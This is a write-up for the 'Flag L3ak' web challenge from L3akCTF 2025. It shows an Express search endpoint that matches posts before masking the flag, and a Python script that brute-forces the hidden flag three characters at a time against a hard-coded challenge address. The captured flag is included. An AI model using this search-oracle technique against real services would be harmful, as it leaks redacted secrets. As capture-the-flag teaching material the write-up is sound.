---
title: Flag L3ak
date: 2025-07-14T21:45:51+03:00
description: Writeup for Flag L3ak [L3akCTF_2025s]
author: vikcoc
tags:
- web
draft: false
---
___

## Challenge Description

What's the name of this CTF? Yk what to do 😉

We are greeted by a blog page, with a search bar and a few posts.\
One post in particular, titled "Not the flag?" claims to have the flag hidden inside it.

## Intuition

Looking at the code we see it is an expressjs application, with public pages and 2 endpoints of interest:\
- `'/api/search'`
- `'/api/posts'`


Search is of particular interest for us because the lookup happens before the flag gets overwritten.
```javascript
    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));
```
Therefore we can use search to check if sequences are part of the flag.

## Solution

The solution is a brute force attack.
```python
import requests
import string

url = "http://34.134.162.213:17000/api/search"
flag = "L3AK{"

print("Start")
while True:

    found_char = False
    for char in string.printable:
        query = f"{flag[-2:]}{char}"
        body = {"query": query}
        response = requests.post(url, json=body)

        if response.status_code == 200 and "Not the flag?" in response.text:
            flag += char
            print(f"Partial flag: {flag}")
            found_char = True
            break
    
    if not found_char:
        break;

print(f"End")
```
A thing to keep in mind is that the query is only allowed to have 3 characters.
```javascript
    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ 
            error: 'Query must be 3 characters.',
        });
    }
```

### Flag

`L3AK{L3ak1ng_th3_Fl4g??}`
